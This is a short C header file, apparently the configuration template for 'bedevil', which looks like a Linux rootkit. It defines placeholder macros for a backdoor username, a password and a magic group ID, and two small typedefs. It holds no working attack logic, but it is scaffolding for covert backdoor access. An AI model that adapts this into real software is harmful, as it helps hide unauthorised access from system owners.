/*
* YOU NEED NOT TOUCH ANYTHING IN THIS FILE.
* MAY BEDEVIL.SH DO THE WORK.
*/

#ifndef BEDEVIL_H
#define BEDEVIL_H

#define BD_UNAME "??BD_UNAME??"
#define BD_PWD "??BD_PWD??"
#define MAGIC_GID ??MAGIC_GID??

typedef struct symbol_struct {
    void *(*func)();
} syms;

typedef struct strings_struct {
    char *str;
} strs;
